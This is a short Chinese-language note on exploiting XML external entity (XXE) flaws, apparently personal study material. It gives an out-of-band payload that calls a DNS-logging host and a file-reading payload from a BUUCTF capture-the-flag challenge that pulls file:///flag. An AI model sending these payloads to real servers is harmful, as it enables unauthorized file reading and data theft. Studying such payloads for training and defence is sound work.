# XXE漏洞利用

## 1、漏洞利用前提

1. url是 .ashx后缀
2. 响应体是xml

## 2、在线测试网站

```
http://www.dnslog.cn/
```

## 3、发包格式

```
<?xml version="1.0" ?>
<!DOCTYPE r [
// <!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://127.0.0.1:80">
]>
<r>&sp;</r>

//把http://127.0.0.1:80替换成你的Get SubDomain
```

## 4、任意文件读取

* 原理就是构造一个可以访问系统默认文件hosts的Payload，然后看看响应，看他说缺啥补充啥。如果是回显型XXE就会将配置文件的信息打印出来

```
BUUCTF:[CSAWQual 2019]Web_Unagi

<?xml version='1.0'?>
<!DOCTYPE users [
<!ENTITY xxe SYSTEM "file:///flag" >]>
<users>
    <user>
        <username>bob</username>
        <password>passwd2</password>
        <name> Bob</name>
        <email>bob@fakesite.com</email>  
        <group>CSAW2019</group>
        <intro>&xxe;</intro>
    </user>
</users>
```

